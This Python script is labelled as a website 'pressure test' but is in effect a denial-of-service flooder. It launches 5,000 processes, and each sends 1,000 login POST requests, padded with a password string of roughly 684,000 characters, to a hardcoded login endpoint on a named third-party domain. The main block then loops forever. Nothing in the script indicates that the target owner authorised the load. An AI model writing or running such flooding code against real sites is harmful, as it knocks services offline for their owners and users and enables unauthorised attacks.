import requests
from multiprocessing import Process
import time, os

def test_website_pressure(url, requests_per_process=10):
    for i in range(requests_per_process):
        try:
            response = requests.post(url, json={"username": "admin", "password": "123456" * 114514})
            print(f"Process {os.getpid()} - Request {i+1}: Status {response.status_code}")
        except Exception as e:
            print(f"Process {os.getpid()} - Request {i+1}: Error {e}")

if __name__ == "__main__":
    import os

    # url = input("Enter the URL to test: ").strip()
    url = "https://dingdingworld.com/api/login"
    # num_processes = int(input("Enter number of processes: ").strip())
    num_processes = 5000
    # requests_per_process = int(input("Enter number of requests per process: ").strip())
    requests_per_process = 1000
    
    processes = []
    start_time = time.time()
    for _ in range(num_processes):
        p = Process(target=test_website_pressure, args=(url, requests_per_process),daemon=True)
        processes.append(p)
        p.start()
    while(1):
        pass
